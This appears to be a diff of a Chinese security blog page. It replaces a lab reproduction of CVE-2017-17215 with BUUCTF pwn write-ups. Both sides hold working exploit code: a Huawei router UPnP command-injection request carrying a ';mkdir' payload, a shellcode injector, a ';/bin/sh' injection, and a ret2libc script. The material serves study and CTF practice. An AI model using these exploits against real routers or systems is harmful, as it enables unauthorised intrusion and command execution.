@@ -6,32 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yoursite.com">
-  <title>CVE-2017-17215复现 | 欢迎来到我的博客！</title>
+  <title>buuctf-pwn | 欢迎来到我的博客！</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="复现 web端登录账号密码：admin，@Hua1234 安装qemu  安装依赖文件： 1apt-get install libglib2.0 libglib2.0-dev autoconf automake libtool uml-utilities bridge-utils  下载模拟系统镜像和大端机： https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;mips">
+  <meta name="description" content="PWN刷题mrctf2020_shellcode运行一下 1.&#x2F;mrctf2020_shellcode   执行程序发现，程序要求输入某个字符串。 查看一下保护 1checksec mrctf2020_shellcode   1、程序架构是 amd64,64位，小端模式2、got表只读不可写3、没有启用栈保护4、栈中数据有执行权限5、启用位置无关可执行文件即编译时将程序编译为位置无关，程序运行时各">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2017-17215复现">
-<meta property="og:url" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="buuctf-pwn">
+<meta property="og:url" content="https://yoursite.com/2024/02/18/buuctf-pwn/index.html">
 <meta property="og:site_name" content="欢迎来到我的博客！">
-<meta property="og:description" content="复现 web端登录账号密码：admin，@Hua1234 安装qemu  安装依赖文件： 1apt-get install libglib2.0 libglib2.0-dev autoconf automake libtool uml-utilities bridge-utils  下载模拟系统镜像和大端机： https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;mips">
+<meta property="og:description" content="PWN刷题mrctf2020_shellcode运行一下 1.&#x2F;mrctf2020_shellcode   执行程序发现，程序要求输入某个字符串。 查看一下保护 1checksec mrctf2020_shellcode   1、程序架构是 amd64,64位，小端模式2、got表只读不可写3、没有启用栈保护4、栈中数据有执行权限5、启用位置无关可执行文件即编译时将程序编译为位置无关，程序运行时各">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240208155017023.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220456220.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220543495.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212160548814.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212161815900.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212162040772.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220844160.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212163848840.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164001679.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164627024.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212174629800.png">
-<meta property="og:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212165016599.png">
-<meta property="article:published_time" content="2024-02-12T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-13T14:12:59.179Z">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104334527.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104502746.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104916479.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218110338734.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218161318705.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218161407617.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218161635975.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218162133703.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218163325557.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218163520617.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218180822229.png">
+<meta property="og:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218180902406.png">
+<meta property="article:published_time" content="2024-02-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-18T14:33:35.437Z">
 <meta property="article:author" content="shy">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240208155017023.png">
+<meta name="twitter:image" content="https://yoursite.com/2024/02/18/buuctf-pwn/image-20240218104334527.png">
   
     <link rel="alternative" href="/atom.xml" title="欢迎来到我的博客！" type="application/atom+xml">
   
@@ -173,71 +173,82 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CVE-2017-17215复现" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-buuctf-pwn" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：375字 | 预计阅读时长：1分钟
+    字数：626字 | 预计阅读时长：2分钟
 </div>
         
   
     <h1 class="article-title" itemprop="name">
-      CVE-2017-17215复现
+      buuctf-pwn
     </h1>
   
 
         
-        <a href="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2024-02-12T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-02-13</time>
+        <a href="/2024/02/18/buuctf-pwn/" class="archive-article-date">
+  	<time datetime="2024-02-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-02-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240208155017023.png"></p>
-<p>web端登录账号密码：admin，@Hua1234</p>
-<p>安装qemu</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220456220.png"></p>
-<p>安装依赖文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libglib2<span class="number">.0</span> libglib2<span class="number">.0</span>-dev autoconf automake libtool uml-utilities bridge-utils</span><br></pre></td></tr></table></figure>
+        <h1 id="PWN刷题"><a href="#PWN刷题" class="headerlink" title="PWN刷题"></a>PWN刷题</h1><h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>运行一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mrctf2020_shellcode</span><br></pre></td></tr></table></figure>
 
-<p>下载模拟系统镜像和大端机：</p>
-<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a></p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220543495.png"></p>
-<p>创建网桥，添加IP：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr Virbr0</span><br><span class="line">ifconfig Virbr0 <span class="number">192.168</span><span class="number">.147</span><span class="number">.100</span>/<span class="number">24</span> up</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104334527.png"></p>
+<p>执行程序发现，程序要求输入某个字符串。</p>
+<p>查看一下保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec mrctf2020_shellcode</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104502746.png"></p>
+<p>1、程序架构是 amd64,64位，小端模式<br>2、got表只读不可写<br>3、没有启用栈保护<br>4、栈中数据有执行权限<br>5、启用位置无关可执行文件即编译时将程序编译为位置无关，程序运行时各个段加载的虚拟地址在装载时才确定<br>6、存在可读可写可执行段。</p>
+<p>使用ida pro 静态分析mrctf2020_shellcode程序</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218104916479.png"></p>
+<p>可以看到</p>
+<p>程序设置了410h的栈，使用_puts显示Show me your magic!之后，使用_read从标准输入读400h字符放入了rax，rax指向rbp+buf即栈中，然后输入串长度与0比较，大于0则跳转到loc_11D6即栈顶。也就是程序会从标准输入读取数据放入栈中，再跳转到栈中，并且从checksec可知栈是可执行的。那么直接把shellcode提供给程序输入即可。</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212160548814.png"></p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212161815900.png"></p>
-<p>ping测试一下</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212162040772.png"></p>
-<p>创建tap接口，添加到Virbr0内：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tunctl -t tap0</span><br><span class="line">ifconfig tap0 <span class="number">192.168</span><span class="number">.147</span><span class="number">.101</span>/<span class="number">24</span> up</span><br><span class="line">brctl addif Virbr0 tap0</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240213220844160.png"></p>
-<p>在系统内再开启一个bedain系统：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux<span class="number">-2.6</span><span class="number">.32</span><span class="number">-5</span><span class="number">-4</span>kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic</span><br></pre></td></tr></table></figure>
-
-<p>将提取出来的嵌入式系统squashfs-root传到虚拟机内：</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212163848840.png"></p>
-<p>在根目录下启动shell：</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164001679.png"></p>
-<p>再开一个终端使用ssh连接该虚拟机，用来开启upnp和mic：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.147</span><span class="number">.102</span></span><br><span class="line">chroot squashfs-root /bin/sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure>
-
-<p>测试37215端口是否开启</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212164627024.png"></p>
-<p>运行exp脚本</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212174629800.png"></p>
-<p>前后对比发现成功新建了文件</p>
-<p><img src="/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/image-20240212165016599.png"></p>
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218110338734.png"></p>
+<h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>运行看一下</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161318705.png"></p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161407617.png"></p>
+<p>case1中存在system函数</p>
+<p><code>*(_QWORD *)dest = 0x20676E6970LL;</code></p>
+<p>dest的含义是ping ；当输入ip地址时就会执行ping命令，但在<code>system</code>执行函数时,加上<code>;</code>那么前后两个命令都会执行，所以我们拼接<code>strcat</code>中加上<code>;/bin/sh</code>就可以得到<code>shell</code>。</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218161635975.png"></p>
+<p>尝试一下，成功了</p>
 <p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">   &lt;NewStatusURL&gt;;mkdir hack1;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">   &lt;NewDownloadURL&gt;;mkdir hello1;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">  &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string"> &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://192.168.147.102:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_router&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>成功</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218162133703.png"></p>
+<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p>查看保护</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218163325557.png"></p>
+<p>ida查看</p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218163520617.png"></p>
+<ul>
+<li><code>32</code>位<code>libc</code>泄露</li>
+<li><code>ret2libc</code></li>
+</ul>
+<ol>
+<li>存在漏洞函数<code>vulnerable_function</code>变量<code>buf</code>存在溢出</li>
+<li>常规<code>32</code>位泄露<code>libc</code></li>
+</ol>
+<p>首先确定一下偏移量，gdb调试一下</p>
+<p><code>b *0x08048465</code></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218180822229.png"></p>
+<p><img src="/2024/02/18/buuctf-pwn/image-20240218180902406.png"></p>
+<p>偏移量即136+4&#x3D;140</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./jar_level3&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./jar_level3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25210</span>)</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt) + p32(main_plt) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys_addr) + p32(main_plt) + p32(bin_sh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload1泄露write函数的地址，以此计算libc库的基址，根据libc库的基址获取system和&#x2F;bin&#x2F;sh的地址，payload2执行shell。</p>
 
       
 
@@ -317,7 +328,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://yoursite.com/2024/02/13/CVE-2017-17215%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yoursite.com/2024/02/18/buuctf-pwn/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -331,18 +342,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2024/02/14/CVE-2020-13390/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CVE-2020-13390
-        
-      </div>
-    </a>
   
-  
-    <a href="/2024/02/11/CVE-2017-17215/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CVE-2017-17215</div>
+    <a href="/2024/02/17/CVE-2021-43474/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2021-43474</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -369,7 +371,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">复现</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">PWN刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mrctf2020-shellcode"><span class="toc-number">1.1.</span> <span class="toc-text">mrctf2020_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-router"><span class="toc-number">1.2.</span> <span class="toc-text">bjdctf_2020_router</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level4"><span class="toc-number">1.3.</span> <span class="toc-text">jarvisoj_level4</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
